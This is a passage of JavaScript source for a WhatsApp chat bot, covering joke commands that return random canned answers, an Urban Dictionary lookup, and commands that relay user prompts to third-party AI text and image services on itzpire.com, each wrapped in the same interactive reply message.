                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'is': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'when': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'what': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'where': {
if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'how': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'rate': {
            	if (!text) return replygcxeon(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'define': 
if (!q) return replygcxeon(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcxeon(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: reply
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
} catch (err) {
    console.log(err)
    return replygcxeon(`*${q}* isn't a valid text`)
    }
    break
    case 'blackboxai': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} write a program to delete file`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Blackbox AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'travel-assistant': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} how can i visit taj mahal`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Travel Assistant AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'dalle': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/dalle?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Dalle\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'guru-ai': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Guru AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'emi-ai': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Emi AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'claude-ai': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Claude AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break 
    case 'hercai-cartoon': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=animefy&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Animefy\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'hercai-lexica': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Lexica\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Prodia\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Simurg\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'hercai-raava': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Raava\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: XeonBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return replygcxeon(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Shonin\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
